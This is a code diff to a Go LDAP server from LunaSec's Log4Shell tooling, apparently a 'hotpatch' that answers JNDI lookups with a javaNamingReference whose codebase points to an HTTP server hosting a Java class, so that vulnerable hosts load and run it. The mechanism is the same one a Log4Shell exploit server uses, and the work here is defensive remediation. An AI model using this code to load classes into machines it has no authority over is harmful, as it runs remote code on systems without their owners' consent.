@@ -18,8 +18,9 @@ import (
 	"fmt"
 	ldapmsg "github.com/lor00x/goldap/message"
 	"github.com/lunasec-io/lunasec/tools/log4shell/constants"
-	"github.com/lunasec-io/lunasec/tools/log4shell/util"
 	"github.com/rs/zerolog/log"
+	"io/ioutil"
+	golog "log"
 )
 
 import (
@@ -28,10 +29,12 @@ import (
 
 type Log4ShellLDAPServer interface {
 	Start()
+	Stop()
 }
 
 type HotpatchLDAPServer struct {
 	ipAddress string
+	server *ldapserver.Server
 }
 
 func NewHotpatchLDAPServer(ipAddress string) Log4ShellLDAPServer {
@@ -40,28 +43,26 @@ func NewHotpatchLDAPServer(ipAddress string) Log4ShellLDAPServer {
 	}
 }
 
-func (s *HotpatchLDAPServer) hotpatchPayloadUrl() string {
-	return fmt.Sprintf("http://%s:%d/%s", s.ipAddress, constants.HotpatchServerPort, constants.HotpatchJarFileName)
+func (s *HotpatchLDAPServer) hotpatchCodebaseUrl() string {
+	return fmt.Sprintf("http://%s:%d/", s.ipAddress, constants.HotpatchServerPort)
 }
 
 func (s *HotpatchLDAPServer) Start() {
-	server := ldapserver.NewServer()
+	ldapserver.Logger = golog.New(ioutil.Discard, "", golog.LstdFlags)
+
+	s.server = ldapserver.NewServer()
 	routes := ldapserver.NewRouteMux()
 
 	routes.Search(s.search)
 	routes.Bind(s.bind)
-	server.Handle(routes)
-
-	util.HandleProcessExit(func() {
-		server.Stop()
-	})
+	s.server.Handle(routes)
 
 	go func() {
 		addr := "0.0.0.0:1389"
-		log.Debug().
+		log.Info().
 			Str("addr", addr).
 			Msg("starting hotpatch server")
-		err := server.ListenAndServe(addr)
+		err := s.server.ListenAndServe(addr)
 		if err != nil {
 			log.Error().
 				Err(err).
@@ -71,12 +72,16 @@ func (s *HotpatchLDAPServer) Start() {
 	}()
 }
 
-func (s *HotpatchLDAPServer) createSearchResponse(req ldapmsg.SearchRequest) ldapmsg.SearchResultEntry {
-	resolvedJNDICodebase := ldapmsg.AttributeValue(s.hotpatchPayloadUrl())
+func (s *HotpatchLDAPServer) Stop() {
+	s.server.Stop()
+}
 
-	e := ldapserver.NewSearchResultEntry("cn=log4shell-hotpatch" + string(req.BaseObject()))
+func (s *HotpatchLDAPServer) createSearchResultEntry(req ldapmsg.SearchRequest) ldapmsg.SearchResultEntry {
+	resolvedJNDICodebase := ldapmsg.AttributeValue(s.hotpatchCodebaseUrl())
+
+	e := ldapserver.NewSearchResultEntry("cn=log4shell-hotpatch, " + string(req.BaseObject()))
 	e.AddAttribute("cn", "log4shell-hotpatch")
-	e.AddAttribute("javaClassName", "")
+	e.AddAttribute("javaClassName", "attempting to patch Log4Shell vulnerability...")
 	e.AddAttribute("javaCodeBase", resolvedJNDICodebase)
 	e.AddAttribute("objectclass", "javaNamingReference")
 	e.AddAttribute("javaFactory", "Log4ShellHotpatch")
@@ -84,9 +89,9 @@ func (s *HotpatchLDAPServer) createSearchResponse(req ldapmsg.SearchRequest) lda
 }
 
 func (s *HotpatchLDAPServer) search(w ldapserver.ResponseWriter, msg *ldapserver.Message) {
-	log.Debug().
+	log.Info().
 		Str("client", msg.Client.Addr().String()).
-		Msg("search request from remote client")
+		Msg("LDAP search request from remote client")
 
 	req := msg.GetSearchRequest()
 
@@ -94,16 +99,20 @@ func (s *HotpatchLDAPServer) search(w ldapserver.ResponseWriter, msg *ldapserver
 	case <-msg.Done:
 		log.Debug().
 			Msg("remote connection closed")
+	default:
 	}
 
-	res := s.createSearchResponse(req)
+	entry := s.createSearchResultEntry(req)
+	w.Write(entry)
+
+	res := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultSuccess)
 	w.Write(res)
 }
 
 func (s *HotpatchLDAPServer) bind(w ldapserver.ResponseWriter, msg *ldapserver.Message) {
-	log.Debug().
+	log.Info().
 		Str("client", msg.Client.Addr().String()).
-		Msg("bind request from remote client")
+		Msg("LDAP bind request from remote client")
 
 	res := ldapserver.NewBindResponse(ldapserver.LDAPResultSuccess)
 	w.Write(res)
